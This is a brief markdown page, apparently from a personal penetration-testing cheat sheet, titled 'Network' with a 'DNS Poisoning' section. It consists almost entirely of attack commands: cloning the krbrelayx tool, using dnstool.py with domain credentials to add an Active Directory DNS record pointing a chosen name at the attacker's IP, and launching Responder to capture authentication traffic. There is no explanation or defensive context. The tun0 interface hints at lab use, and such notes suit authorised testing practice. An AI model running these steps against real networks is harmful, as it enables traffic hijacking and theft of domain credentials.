---
title: Network
permalink: /Network
---

## DNS Poisoning

```git clone https://github.com/dirkjanm/krbrelayx```  
##  create a new record pointing to my adress  
```python3 dnstool.py -u '$DC\$User' -p '$pass' -a add -r '$wanted_domain' -d $my_ip $BOX_ip```
responder -I tun0 -A
